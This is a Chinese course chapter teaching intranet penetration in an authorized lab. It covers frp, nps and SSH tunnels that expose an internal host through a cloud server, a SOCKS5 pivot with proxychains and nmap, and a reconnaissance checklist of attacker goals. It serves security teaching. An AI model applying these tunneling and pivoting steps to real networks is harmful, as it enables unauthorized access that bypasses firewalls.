# 08.项目八 Windows内网安全

---

# 📌 课前回顾

本项目以项目一至项目七的知识为基础，视角发生一次关键转换——从"守"转"攻"：当攻击者已经突破外网防线进入内网后，会发生什么？

**快速回顾（仅需口头回答，不需写出）：**

1. 项目五中配置的 RDP（3389）和 WinRM（5985）服务，如果密码设置为弱口令（如 `P@ssw0rd`），会有什么风险？
2. 项目六中域控制器的数据库包含所有域用户的密码哈希——如果被窃取意味着什么？
3. 项目一中我们"关闭防火墙方便实验"——在真实内网中，这样做会带来什么后果？

**一句话衔接**：前七个项目我们一直在"搭建和加固服务器"。今天换个视角——**如果我们是攻击者**，拿到一台内网机器后，如何把内网服务暴露到公网、扫描内网、窃取密码、横向移动？理解攻击，才能更好地防御。

---

# 🎯 学习目标

| 层次 | 内容 |
| --- | --- |
| **知识** | 理解内网穿透的原理（出站隧道 → 反向访问）；掌握 frp 的部署与配置；理解 SOCKS5 代理机制；理解 Pass-the-Hash 横向移动原理；掌握纵深防御策略 |
| **技能** | 部署 frps/frpc 并配置 TCP/SOCKS5 隧道；通过 frp 隧道扫描内网和横向移动；实施内网安全加固（SMB签名、防火墙规则等） |
| **素养** | 树立"边界突破 ≠ 安全终结"的纵深防御意识；强化法律意识，明确未授权渗透的法律后果 |

---

# ⚠️ 重难点梳理

| 类型 | 内容 | 说明 |
| --- | --- | --- |
| 重点 | frp 内网穿透的部署与配置 | 腾讯云 CVM 部署 frps + 本机 Win11/phpStudy 部署 frpc，配置 TCP/SOCKS5 隧道 |
| 重点 | 内网信息收集与横向移动 | `ipconfig`/`arp`/`net view` 发现内网，Pass-the-Hash + Impacket 实现横向移动 |
| 难点 | SOCKS5 代理与 proxychains | 理解"一条隧道穿透整个内网"的机制，以及如何让任意工具通过代理工作 |
| 难点 | 内网安全纵深防御体系 | 从攻击者视角理解"为什么防火墙不够"，设计多层防御策略 |

---

# 任务一 内网安全基础与frp内网穿透

## 🧠 理论知识

### 从一个场景说起

> **场景**：你是某公司的安全工程师。公司有一台内网文件服务器（IP: 192.168.1.100），运行着 RDP、Web、SMB 等服务。某天，一名员工电脑中了木马，攻击者拿到了这台电脑的控制权——但攻击者在公司外面，文件服务器在公司内网里，**没有公网 IP**。
>
> 问题：**攻击者如何从外面访问到内网的文件服务器？**

这个问题的答案就是本节课的核心——**内网穿透**。

### 什么是内网？为什么内网不安全？

**内网（Intranet）** 就是公司/学校内部的局域网，使用私有 IP（如 192.168.x.x、10.x.x.x），外网无法直接访问。

但"外网无法直接访问"并不等于"安全"：

```
很多企业的安全思维：
  ✗ "内网有防火墙保护，所以内网是安全的"
  ✓ 正确理解：防火墙只防了"外面进不来"
               但没防"里面出去"
               也没防"进来之后横向移动"
```

> 💡 **一个关键事实**：企业防火墙通常**不阻止出站连接**——内网电脑可以自由访问互联网。这正是内网穿透工具能工作的根本原因。

### frp 如何实现内网穿透？

**frp（Fast Reverse Proxy）** 是最主流的开源内网穿透工具。它的核心思路非常简单：

```
正常情况（无法访问）：
  攻击机(公网) ──✗──→ 防火墙 ──✗──→ 内网主机(192.168.1.100)
  防火墙阻止外部主动连接内网

frp 的解决方案（利用出站通道）：

  ┌────────────┐         ┌────────────────┐         ┌────────────┐
  │   攻击机   │         │  腾讯云 CVM     │         │  内网主机   │
  │ Kali/Win11 │         │  (有公网 IP)    │         │ Win11实验机 │
  │            │         │  frps 服务端    │         │  frpc 客户端│
  │            │         │                 │         │            │
  │  访问      │   ②     │  转发请求       │   ③    │  提供服务   │
  │  :10001───┼────────►│  给 frpc       ├────────►│  RDP(3389) │
  │            │         │                 │         │            │
  │            │         │◄────────────────┼─────────│  主动连接   │
  │            │         │       ①        │         │  (出站)    │
  └────────────┘         └────────────────┘         └────────────┘

  关键：① 是内网主机主动向外连接（出站），防火墙不拦截
       ②③ 攻击机通过这条已建立的连接，反向访问内网服务
```

**用人话说**：frpc（内网主机上）主动"打电话"给 frps（腾讯云服务器），保持通话不断。之后攻击机想访问内网服务时，frps 就把请求顺着这条"电话线"转给 frpc，frpc 再转给本地服务。

这就是为什么叫"**反向**代理"——正常的代理是"帮你往外访问"，frp 是"帮外面访问你"。

### 你需要知道的 frp 知识（最小必要知识）

| 概念 | 说明 |
| --- | --- |
| **frps** | 服务端，部署在有公网 IP 的机器上（本课用腾讯云 CVM） |
| **frpc** | 客户端，运行在内网主机上（本课用本机 Win11 + phpStudy） |
| **TCP 隧道** | 把内网的一个端口映射到 CVM 的一个端口（如 80 → 10002） |
| **SOCKS5 代理** | 一条隧道，让攻击机"进入"整个内网（任务二详细讲） |
| **token 认证** | frpc 连接 frps 时的密码，防止别人连上来 |

> 💡 **不需要现在记住所有配置细节**——后面动手实验时会一步步配，那时候再理解每个参数的含义。

> ⚠️ **声明**：本项目内容仅用于授权环境下的安全教学与攻防演练。严禁对未经授权的系统实施任何渗透测试行为，违者将依法承担相应法律责任。

---

## 🛠️ 实践操作

### 实验环境总体说明

> 本项目使用 **腾讯云 CVM** 作为公网穿透服务器，配合**本机 Win11 + phpStudy** 作为内网 Web 主机，通过 frp 实现真实的内网穿透。
>
> **实验架构**：
>
> | 设备 | 角色 | 运行位置 | 操作系统 |
> | --- | --- | --- | --- |
> | **腾讯云 CVM** | 公网穿透服务器（frps） | 腾讯云 | Ubuntu 22.04 |
> | **Win11 实验主机** | 内网 Web 主机（phpStudy + frpc） | 本机电脑 | Windows 11 |
> | **攻击/验证端** | 浏览器、Nmap、proxychains 等验证工具 | 本机/教师演示环境 | Windows 11、WSL 或 Kali |
>
> **预估费用**：CVM 按量付费约 ¥3-8（实验 3-4 小时）。**实验结束后务必释放 CVM 实例和公网 IP，避免持续扣费。**
>
> ⚠️ **配置要求**：
> - CVM 需要分配**公网 IP**，安全组需放行 frp 相关端口
> - Win11 实验主机需能访问互联网，以便 frpc 主动连接 CVM 的 frps
> - 本项目基础实验不再要求本地虚拟机；需要 Linux 工具的扫描步骤可由教师演示环境、WSL 或 Kali 完成

---

### 实验1：腾讯云服务器购买与frp服务端部署

> **实验目标**：购买腾讯云 CVM 服务器，配置安全组，通过腾讯云网页登录部署 frp 服务端（frps）。

**第一步：购买腾讯云 CVM 服务器**

1. 访问腾讯云官网，注册并登录账号
2. 进入 **云服务器 CVM** 控制台，点击"新建/购买实例"
3. 配置如下：

| 配置项 | 推荐选择 |
| --- | --- |
| **计费方式** | 按量付费（实验用完即释放） |
| **地域** | 离你最近的区域（如广州、上海、南京等） |
| **实例规格** | 2 vCPU / 2 GB 或 2 vCPU / 4 GB 均可 |
| **镜像** | Ubuntu 22.04 64位 |
| **系统盘** | 40 GB 云硬盘 |
| **网络** | 私有网络 VPC（使用默认） |
| **公网IP** | 勾选"分配免费公网 IPv4 地址"或绑定弹性公网 IP |
| **登录凭证** | 设置 root 密码 |

4. 创建完成后，在实例列表中记录 **公网 IP 地址**（后续以 `<CVM公网IP>` 表示）

> ⚠️ **费用提醒**：按量付费实验 3-4 小时约 ¥3-8。**实验结束后务必释放 CVM 实例和公网 IP！**

**第二步：配置安全组**

安全组是腾讯云 CVM 的虚拟防火墙，控制哪些端口可以从外部访问。

1. CVM 控制台 → 安全组 → 配置规则
2. 添加以下**入方向**规则：

| 协议类型 | 端口范围 | 授权对象 | 用途 |
| --- | --- | --- | --- |
| TCP | 22 | 0.0.0.0/0 | SSH 远程管理 |
| TCP | 7000 | 0.0.0.0/0 | frp 客户端连接端口 |
| TCP | 7500 | 0.0.0.0/0 | frp Dashboard 管理面板 |
| TCP | 10000-20000 | 0.0.0.0/0 | frp 隧道映射端口范围 |
| ICMP | -1/-1 | 0.0.0.0/0 | ping 测试 |

> 💡 **安全组说明**：腾讯云安全组默认拒绝未放行的入站流量，必须手动添加允许规则。`0.0.0.0/0` 表示允许所有来源，实验环境可用；生产环境应限制为特定 IP。

**第三步：使用腾讯云网页登录 CVM 并安装 frp**

本实验不使用本机终端 SSH 连接服务器，统一使用腾讯云控制台提供的网页登录方式：

1. CVM 控制台 → 实例列表 → 找到目标服务器
2. 点击 **登录** → 选择 **标准登录/Linux WebShell**（不同控制台界面名称可能略有差异）
3. 输入 root 密码进入网页终端
4. 后续命令均在这个网页终端中执行

先在本机准备好 `frp_0.61.1_linux_amd64.tar.gz` 压缩包，然后在腾讯云 WebShell 页面使用**文件上传**功能，将压缩包上传到服务器的 `/opt` 目录。

> 💡 **注意**：本实验不要求在 CVM 上使用 `wget` 下载 frp。服务器端只负责接收已上传的压缩包并解压。

```bash
# 更新系统
apt update && apt upgrade -y

# 进入压缩包所在目录
cd /opt

# 确认压缩包已上传
ls frp_0.61.1_linux_amd64.tar.gz

# 直接解压并整理目录
tar -xzf frp_0.61.1_linux_amd64.tar.gz
mv frp_0.61.1_linux_amd64 frp
cd frp

# 验证文件
ls frps frps.toml
# frps —— 服务端可执行文件
# frps.toml —— 服务端配置文件
```

**第四步：配置并启动 frps**

```bash
# 使用 vim 编辑服务端配置
vim /opt/frp/frps.toml
```

在 `vim` 中按 `i` 进入插入模式，写入以下内容；写完后按 `Esc`，输入 `:wq` 保存退出：

```toml
bindPort = 7000

webServer.addr = "0.0.0.0"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin123"

auth.method = "token"
auth.token = "ClassDemo2025"

log.to = "./frps.log"
log.level = "info"
log.maxDays = 7

allowPorts = [
  { start = 10000, end = 20000 }
]
```

```bash
# 启动 frps
/opt/frp/frps -c /opt/frp/frps.toml

# 预期输出：
# [I] frps tcp listen on 0.0.0.0:7000
# [I] http service listen on 0.0.0.0:7500
# [I] frps started successfully
```

```bash
# 后台运行（按 Ctrl+Z 暂停后执行）
bg
disown

# 验证监听端口
ss -tlnp | grep -E "7000|7500"
# 预期：7000 和 7500 端口均在监听
```

**第五步（可选）：将 frps 注册为 systemd 服务（推荐）**

上面的 `bg + disown` 方式简单但不可靠——网页登录会话断开或服务器重启后 frps 不会自动恢复。在真实运维中，推荐注册为 systemd 服务：

```bash
# 使用 vim 创建 systemd 服务文件
vim /etc/systemd/system/frps.service
```

写入以下内容，保存退出：

```ini
[Unit]
Description=frp server (frps)
After=network.target

[Service]
Type=simple
ExecStart=/opt/frp/frps -c /opt/frp/frps.toml
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```bash
# 启用并启动服务
systemctl daemon-reload
systemctl enable frps
systemctl start frps

# 查看状态
systemctl status frps
# 预期：Active: active (running)

# 常用管理命令
systemctl stop frps      # 停止
systemctl restart frps   # 重启
journalctl -u frps -f    # 查看实时日志
```

> 💡 **为什么推荐 systemd？** 网页登录会话断开不会影响服务；服务器重启后 frps 自动启动；日志可通过 `journalctl` 统一管理。课堂实验用 `bg + disown` 即可，生产环境务必用 systemd。

**第六步：访问 frp Dashboard**

在本地浏览器中打开 `http://<CVM公网IP>:7500`，用户名 `admin`，密码 `admin123`。预期显示 frp Dashboard 页面（此时无客户端连接）。

---

### 实验2：Win11 + phpStudy 配置与frp客户端部署

> **实验目标**：在本机 Windows 11 上安装 phpStudy，搭建一个可适配手机端的内网页面，部署 frp 客户端（frpc），通过腾讯云 CVM 将本机 Web 服务暴露到公网进行验证。

**第一步：安装并启动 phpStudy**

1. 在 Win11 浏览器访问 phpStudy 官网，下载 Windows 版安装包
2. 按默认路径安装，建议安装到 `C:\phpstudy_pro`
3. 打开 phpStudy，启动 **Apache** 服务
4. 在浏览器访问 `http://127.0.0.1`，确认能看到默认页面

> 💡 **说明**：本实验用本机 Win11 代替本地虚拟机。phpStudy 提供 Web 服务，frpc 运行在 Win11 上，主动连接腾讯云 CVM 的 frps。

**第二步：创建一个美观的响应式测试页面**

在 phpStudy 的网站根目录中创建或覆盖 `index.html`。常见路径为：

```text
C:\phpstudy_pro\WWW\index.html
```

写入以下页面内容：

```html
<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Win11 phpStudy 内网服务</title>
  <style>
    :root {
      color-scheme: light;
      --ink: #17202a;
      --muted: #5c6b7a;
      --line: #d8e0e8;
      --brand: #0f8b8d;
      --accent: #f2b134;
      --bg: #f7fafc;
      --panel: #ffffff;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: "Microsoft YaHei", "Segoe UI", sans-serif;
      color: var(--ink);
      background:
        linear-gradient(135deg, rgba(15, 139, 141, .12), rgba(242, 177, 52, .12)),
        var(--bg);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
    }

    main {
      width: min(960px, 100%);
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      box-shadow: 0 18px 50px rgba(23, 32, 42, .12);
      overflow: hidden;
    }

    .hero {
      display: grid;
      grid-template-columns: 1.2fr .8fr;
      gap: 28px;
      padding: 42px;
      align-items: center;
    }

    h1 {
      margin: 0 0 14px;
      font-size: clamp(30px, 5vw, 54px);
      line-height: 1.05;
      letter-spacing: 0;
    }

    p {
      margin: 0;
      color: var(--muted);
      font-size: 17px;
      line-height: 1.8;
    }

    .status {
      display: grid;
      gap: 12px;
      margin-top: 28px;
    }

    .item {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 12px 14px;
      border: 1px solid var(--line);
      border-radius: 8px;
      background: #fbfdff;
      font-size: 15px;
    }

    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: var(--brand);
      box-shadow: 0 0 0 5px rgba(15, 139, 141, .12);
      flex: 0 0 auto;
    }

    .visual {
      border-radius: 8px;
      border: 1px solid var(--line);
      padding: 22px;
      background: linear-gradient(160deg, #e8f6f6, #fff7df);
    }

    .screen {
      min-height: 250px;
      border-radius: 8px;
      background: #17202a;
      color: #e9f5f5;
      padding: 18px;
      display: grid;
      align-content: space-between;
      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, .08);
    }

    .chip {
      display: inline-flex;
      width: max-content;
      align-items: center;
      gap: 8px;
      padding: 8px 10px;
      border-radius: 8px;
      background: rgba(255, 255, 255, .1);
      color: #fff;
      font-size: 13px;
    }

    .metric {
      font-size: 44px;
      font-weight: 700;
      letter-spacing: 0;
    }

    footer {
      display: flex;
      justify-content: space-between;
      gap: 16px;
      padding: 18px 42px;
      border-top: 1px solid var(--line);
      color: var(--muted);
      font-size: 14px;
      background: #fbfdff;
    }

    @media (max-width: 760px) {
      body { padding: 14px; }
      .hero { grid-template-columns: 1fr; padding: 28px; }
      footer { flex-direction: column; padding: 16px 28px; }
      .screen { min-height: 210px; }
    }
  </style>
</head>
<body>
  <main>
    <section class="hero">
      <div>
        <h1>内网 Web 服务已就绪</h1>
        <p>这是运行在本机 Win11 phpStudy 中的测试页面。公网访问请求会先到达腾讯云 CVM，再通过 frp 隧道转发回本机。</p>
        <div class="status">
          <div class="item"><span class="dot"></span><span>phpStudy Apache 正在提供本地 Web 服务</span></div>
          <div class="item"><span class="dot"></span><span>frpc 主动连接腾讯云 frps</span></div>
          <div class="item"><span class="dot"></span><span>页面已适配手机、平板和桌面浏览器</span></div>
        </div>
      </div>
      <div class="visual" aria-hidden="true">
        <div class="screen">
          <span class="chip">CVM :10002 → Win11 :80</span>
          <div class="metric">HTTP 200</div>
          <span>frp tunnel online</span>
        </div>
      </div>
    </section>
    <footer>
      <span>Windows 服务器安全配置 · 项目八</span>
      <span>Win11 + phpStudy + frp</span>
    </footer>
  </main>
</body>
</html>
```

保存后访问 `http://127.0.0.1`，确认页面能正常显示；再用手机浏览器访问同一公网映射地址时，页面会自动适配窄屏。

**第三步：下载并配置 frpc**

```powershell
# 在 Win11 上以管理员身份打开 PowerShell
cd C:\
Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_windows_amd64.zip" -OutFile "frp.zip"
Expand-Archive -Path "frp.zip" -DestinationPath "C:\frp" -Force

# 编辑客户端配置
notepad C:\frp\frpc.toml
```

写入以下内容（**将 `<CVM公网IP>` 替换为你的腾讯云 CVM 实际公网 IP**）：

```toml
serverAddr = "<CVM公网IP>"
serverPort = 7000

auth.method = "token"
auth.token = "ClassDemo2025"

log.to = "./frpc.log"
log.level = "info"

# Web映射：外部访问 <CVM公网IP>:10002 → Win11 phpStudy 的 80
[[proxies]]
name = "web"
type = "tcp"
localIP = "127.0.0.1"
localPort = 80
remotePort = 10002

# SOCKS5代理：通过隧道访问 Win11 实验主机本地网络
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 10080
[proxies.plugin]
type = "socks5"
```

> ⚠️ **扩展说明**：RDP、WinRM、SMB 等高风险服务不再作为本机基础实验默认开放。后续弱口令、PtH 等内容应使用教师授权的专用靶机或课堂演示环境，避免把个人电脑的管理端口暴露到公网。

**第四步：启动 frpc**

```powershell
# 前台启动（便于观察初始连接是否成功）
C:\frp\frpc.exe -c C:\frp\frpc.toml

# 预期输出：
# [I] login to server success
# [I] proxy added: [web socks5]
# [I] [web] start proxy success
# [I] [socks5] start proxy success
```

> ⚠️ **如果连接失败**：检查（1）腾讯云安全组是否放行 7000 端口；（2）frpc.toml 中 IP 和 token 是否正确；（3）Win11 是否能访问互联网；（4）phpStudy 的 Apache 是否已启动。

**第五步（可选）：将 frpc 注册为 Windows 服务（推荐）**

前台运行的 frpc 在关闭 PowerShell 窗口或重启后就会停止。推荐使用 **NSSM**（Non-Sucking Service Manager）将其注册为 Windows 服务，实现开机自启和自动恢复：

```powershell
# 1. 下载 NSSM（服务管理工具）
Invoke-WebRequest -Uri "https://nssm.cc/release/nssm-2.24.zip" -OutFile "C:\nssm.zip"
Expand-Archive -Path "C:\nssm.zip" -DestinationPath "C:\nssm" -Force

# 2. 注册 frpc 为 Windows 服务
C:\nssm\nssm-2.24\win64\nssm.exe install frpc "C:\frp\frpc.exe" "-c" "C:\frp\frpc.toml"

# 3. 配置服务自动重启（失败后5秒重启）
C:\nssm\nssm-2.24\win64\nssm.exe set frpc AppRestartDelay 5000
C:\nssm\nssm-2.24\win64\nssm.exe set frpc AppStdout "C:\frp\service.log"
C:\nssm\nssm-2.24\win64\nssm.exe set frpc AppStderr "C:\frp\service.log"

# 4. 启动服务
Start-Service frpc

# 5. 验证服务状态
Get-Service frpc
# 预期：Status = Running，StartType = Automatic

# 常用管理命令
Stop-Service frpc        # 停止
Restart-Service frpc     # 重启
Get-Content C:\frp\service.log -Tail 20   # 查看日志
```

> 💡 **为什么推荐 NSSM？** 关闭 PowerShell 窗口不影响 frpc；系统重启后 frpc 自动启动并重新连接 frps；崩溃后自动重启。课堂实验可直接前台运行，生产环境推荐 NSSM 注册服务。

---

### 实验3：验证 frp 隧道穿透效果

> **实验目标**：验证 frp 隧道是否成功将 Win11 phpStudy 的内网 Web 服务暴露到公网。

**第一步：查看 frp Dashboard**

浏览器打开 `http://<CVM公网IP>:7500`，刷新页面，应看到 `web` 和 `socks5` 两条隧道在线。

**第二步：验证各隧道端口**

```bash
# 在具备 nmap 的验证环境中执行
nmap -p 10002,10080 <CVM公网IP>

# 预期：10002 和 10080 端口 open
```

**第三步：验证 Web 穿透**

```bash
curl http://<CVM公网IP>:10002
# 预期：返回 Win11 phpStudy 响应式页面的 HTML
```

也可以直接用电脑或手机浏览器访问：

```text
http://<CVM公网IP>:10002
```

预期：显示实验 2 创建的“内网 Web 服务已就绪”页面，并且手机端布局正常。

> ⚠️ **关键理解**：
> - Win11 实验主机在本地内网中，没有直接对外开放的公网 IP，但通过 frp 隧道，外部可以通过腾讯云 CVM 的公网 IP 访问本机 phpStudy 页面
> - frpc 只需一条**出站连接**（到 CVM:7000），即可将指定内网服务暴露出去
> - 企业防火墙通常不阻止出站连接，这正是内网穿透工具能工作的根本原因

---

## 📝 任务一知识点总结

| 知识点 | 要点 |
| --- | --- |
| 内网为什么不安全 | 防火墙只防"外面进不来"，没防"里面出去"和"进来后横向移动" |
| 内网穿透原理 | 利用防火墙不拦截出站连接的特性，内网主机主动向外建立隧道，外部通过隧道反向访问内网 |
| frp 架构 | frps（服务端，部署在腾讯云 CVM）+ frpc（客户端，运行在内网主机） |
| frp 核心概念 | TCP 隧道（端口映射）、token 认证（密码保护）、Dashboard（可视化管理） |
| 腾讯云安全组 | CVM 的虚拟防火墙，控制入站/出站流量，默认拒绝未放行的入站 |
| 反向代理 | frp 的本质——帮外面的攻击机"反过来"访问内网主机 |

---

# 任务二 内网穿透进阶

## 🧠 理论知识

### SOCKS5 代理与 proxychains

上面的实验中，frp 将 Win11 实验主机的 Web 端口映射到 CVM 上（TCP 隧道）。但 frp 还有一种更强大的模式——**SOCKS5 代理**：只需一条隧道，就可以让攻击机的**所有网络流量**通过 Win11 实验主机转发，就像攻击机直接处于这台主机所在的内网中一样。

```
TCP隧道模式（逐一映射）：
  验证端 → CVM:10002 → Win11实验主机:80（phpStudy Web）
  验证端 → CVM:10001 → 授权靶机:3389（RDP，扩展演示）
  验证端 → CVM:10004 → 授权靶机:445（SMB，扩展演示）
  缺点：每暴露一个服务就要加一条配置

SOCKS5代理模式（一键穿透）：
  验证端 → CVM:10080 → Win11实验主机（SOCKS5服务）→ Win11可访问的任何地址:任何端口
  优点：一条隧道即可访问 Win11 实验主机所在网络中的服务
```

**proxychains** 是 Linux 下的代理链工具，可以强制让任何程序的网络流量通过 SOCKS5 代理转发。配合 frp 的 SOCKS5 隧道，几乎所有网络工具（nmap、hydra、curl 等）都可以通过隧道工作。

---

## 🛠️ 实践操作

### 实验4：SOCKS5 代理与 proxychains 进阶

> ⚠️ **前置条件**：完成实验1-3，frp 隧道已建立，SOCKS5 隧道端口 10080 可用。

**第一步：确认 SOCKS5 代理可用**

```bash
nmap -p 10080 <CVM公网IP>
# 预期：10080/tcp open
```

**第二步：配置 proxychains**

```bash
# 编辑 proxychains 配置
sudo vim /etc/proxychains4.conf

# 在文件末尾 [ProxyList] 部分替换为：
# [ProxyList]
# socks5 <CVM公网IP> 10080
```

**第三步：通过 SOCKS5 代理访问 Win11 phpStudy**

```bash
# 通过代理访问 Win11 实验主机的 Web 服务
proxychains curl http://127.0.0.1
# 预期：返回 phpStudy 页面（SOCKS5 代理从 Win11 本地发起连接，127.0.0.1 就是 Win11 实验主机）

# 通过代理扫描 Win11 实验主机的常见端口
proxychains nmap -sT -p 80,135,139,445 127.0.0.1
# 预期：80 端口 open；其他端口是否开放取决于本机服务状态
```

> 💡 **为什么用 127.0.0.1？**：SOCKS5 代理的连接是从 frpc（Win11 实验主机）本地发起的。当 proxychains 把请求发给 SOCKS5 代理时，代理在 Win11 上向 127.0.0.1 发起连接——即 Win11 实验主机自身。

**第四步：浏览器通过 SOCKS5 代理**

```
Firefox 设置方法：
1. 设置 → 常规 → 网络设置 → 手动代理配置
2. SOCKS 主机：<CVM公网IP>  端口：10080  选择 SOCKS v5
3. 勾选"代理 DNS 时使用 SOCKS v5"

访问 http://127.0.0.1
预期：显示 Win11 phpStudy 页面
```

> ⚠️ **proxychains 下的 nmap 限制**：只能用 `-sT`（TCP Connect）扫描，不能用 `-sS`（SYN扫描）；不能用 ICMP ping；速度较慢。

> 💡 **真实内网场景**：在真实渗透中，已控主机通常处于包含多台主机的企业内网中。通过 SOCKS5 代理，攻击者可扫描整个内网网段，发现更多目标。这正是攻击者突破单台主机后扩展战果的核心手段。

---

### 实验5：nps 内网穿透独立实验（Web管理界面）

> **实验目标**：独立体验 nps 的 Web 管理界面。只需要腾讯云 CVM 和本机 Win11/phpStudy，不依赖前面的 frp 隧道。
>
> ⚠️ **前置条件**：CVM 安全组放行 8080（nps Web 管理）、8024（npc 客户端连接）和 10012（Web 映射端口）；Win11 上 phpStudy 的 Apache 已启动。

**第一步：在腾讯云 CVM 上安装 nps 服务端**

```bash
# 在腾讯云网页登录终端中执行
cd /opt
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
mkdir nps && tar -xzf linux_amd64_server.tar.gz -C nps
cd nps
```

**第二步：配置并启动 nps**

```bash
# 使用 vim 编辑配置
vim conf/nps.conf
```

确认关键配置：

```ini
web_port=8080
web_username=admin
web_password=admin123
bridge_port=8024
bridge_type=tcp
```

> ⚠️ **安全组提醒**：需放行 8080（Web管理）、8024（客户端连接）和 10012（Web 映射）端口。

```bash
# 启动 nps
./nps
# 预期：nps start successfully
```

**第三步：通过 Web 界面添加客户端和隧道**

1. 浏览器访问 `http://<CVM公网IP>:8080`，登录 admin/admin123
2. 客户端 → 新增 → 备注名 `Win11-phpStudy`，验证密钥 `npstest2025` → 保存
3. 点击 `Win11-phpStudy` 旁的"隧道"→ 新增 TCP 隧道：服务端端口 `10012`，目标 `127.0.0.1:80`

**第四步：在 Win11 上运行 nps 客户端**

```powershell
# 在 Win11 上下载并启动 npc
Invoke-WebRequest -Uri "https://github.com/ehang-io/nps/releases/download/v0.26.10/windows_amd64_client.tar.gz" -OutFile "C:\npc.tar.gz"
# 解压后运行：
C:\npc\npc.exe -server=<CVM公网IP>:8024 -vkey=npstest2025
```

**第五步：验证**

```bash
nmap -p 10012 <CVM公网IP>
# 预期：10012/tcp open
```

浏览器访问 `http://<CVM公网IP>:10012`，预期显示 Win11 phpStudy 的响应式页面。

> 💡 **nps vs frp**：nps 有 Web 管理界面，操作直观，适合课堂观察隧道状态；frp 性能更高、配置更灵活、社区更活跃。两个工具安排为独立实验，便于比较配置方式和管理体验。

---

### 实验6：SSH 隧道内网穿透

> SSH 隧道无需安装额外工具，适合临时使用。

**SSH隧道类型**：

```
1. 远程端口转发（-R）——最适合内网穿透：
   内网主机主动 SSH 连接到 CVM，将自己的端口暴露到 CVM 上

2. 本地端口转发（-L）：
   验证端通过 SSH 连接到 CVM，将 CVM 可达的端口映射到本地

3. 动态端口转发（-D）：
   通过 SSH 创建 SOCKS5 代理
```

**远程端口转发（推荐）**：

```powershell
# 在内网主机上执行：将本地 Web 暴露到 CVM 的 10022 端口
ssh -R 10022:127.0.0.1:80 root@<CVM公网IP> -N -f
```

```bash
# 在验证环境中验证
nmap -p 10022 <CVM公网IP>
# 预期：10022/tcp open

curl http://<CVM公网IP>:10022
```

**动态端口转发（SOCKS5）**：

```bash
# 在验证环境中通过 CVM 创建 SOCKS5 代理
ssh -D 1080 root@<CVM公网IP> -N -f

# proxychains 配置：socks5 127.0.0.1 1080
proxychains curl http://127.0.0.1:10002
```

> 💡 **SSH 隧道 vs frp**：SSH 隧道不需要额外安装工具，适合临时使用；frp 更适合持久化穿透（可注册为服务、支持断线重连、有 Dashboard）。

---

## 📝 任务二知识点总结

| 知识点 | 要点 |
| --- | --- |
| SOCKS5代理 | 一条隧道即可访问目标主机所在网络的所有服务，无需逐一配置端口映射 |
| proxychains | 强制让任意程序的网络流量通过 SOCKS5 代理转发 |
| nps | 提供Web管理界面的内网穿透工具，操作直观，适合新手 |
| SSH隧道 | -R远程转发（暴露本地端口）、-D动态转发（SOCKS5代理），无需额外安装 |
| proxychains限制 | 只能用-sT扫描，速度慢，无法使用ICMP和SYN扫描 |

---

# 任务三 内网信息收集

## 🧠 理论知识

### 为什么信息收集是第一步？

攻击者通过 frp 隧道进入内网后，面对的是一个**陌生的网络环境**——不知道有哪些主机、开了什么服务、谁是管理员。盲目攻击不仅效率低，还容易触发告警。

信息收集的目标是回答三个核心问题：

| 问题 | 攻击者需要知道什么 | 为什么重要 |
| --- | --- | --- |
| **我在哪？** | 本机 IP、网段、DNS、域名 | 确定所处的网络位置和可达范围 |
| **周围有什么？** | 同网段主机、开放端口、服务版本 | 发现可攻击的目标 |
| **我能做什么？** | 当前权限、凭据、安全软件状态 | 判断能执行哪些攻击操作 |

### 信息收集的三层体系

```
由近及远，逐步扩展：

第一层：本机信息（你当前控制的机器）
├── 网络配置 → ipconfig /all, route print
│   目的：确定 IP 地址、网关、DNS、是否存在多网卡（多网段可达）
├── 系统信息 → systeminfo
│   目的：OS 版本和补丁列表 → 判断可利用的漏洞
├── 用户和组 → whoami /all, net user
│   目的：当前权限、本地管理员有哪些 → 判断提权路径
└── 进程和服务 → tasklist /svc
    目的：发现安全软件（Defender、杀毒）→ 决定是否需要绕过

第二层：网络邻居（同网段的其他主机）
├── ARP 缓存 → arp -a
│   目的：已通信过的主机列表（被动发现，不产生额外流量）
├── NetBIOS 广播 → net view
│   目的：局域网内可见的 Windows 主机
└── 共享资源 → net share, net view \\主机
    目的：发现可访问的共享文件夹（可能包含敏感数据或可写入恶意文件）

第三层：主动扫描（从外部或通过代理扫描）
├── Nmap 端口扫描 → proxychains nmap -sT
│   目的：发现开放端口和服务版本
├── 漏洞扫描 → nmap --script smb-vuln*
│   目的：检测已知漏洞（如 EternalBlue）
└── 协议枚举 → nmap --script smb-enum-*
    目的：枚举 SMB 共享、用户账户
```

> 💡 **关键原则**：从被动到主动。先用 `arp -a`、`net view` 等不产生扫描流量的命令收集信息，再用 Nmap 等主动扫描工具。被动收集不会触发 IDS 告警，主动扫描可能会。

---

## 🛠️ 实践操作

### 实验7：Windows 内网信息收集（在 Win11 实验主机或授权靶机上执行）

> **操作方式**：本实验同时提供图形界面和命令行两种方式。
>
> **实验背景**：假设你正在对本机 Win11 实验主机或教师提供的授权靶机做安全检查，现在需要了解这台机器和它所在的内网环境。

**第一步：本机网络信息——"我在哪？"**

```powershell
# 查看完整网络配置
ipconfig /all
# 关键看：IPv4 地址（确定网段）、默认网关（内网路由）、DNS 服务器（可能指向域控）

# 查看路由表（发现可达的其他网段）
route print
# 关键看：是否有多个网段路由 → 攻击者可能跳到其他子网

# 查看 ARP 缓存（发现同网段主机，被动方式不触发告警）
arp -a
# 关键看：Interface 下的 IP 列表 = 最近通信过的同网段主机
# 示例输出：
#   192.168.1.1        00-50-56-xx-xx-xx    动态    ← 网关
#   192.168.1.10       00-0c-29-xx-xx-xx    动态    ← 同网段另一台主机！

# 查看活跃网络连接（正在通信的主机和端口）
netstat -an | findstr "ESTABLISHED"
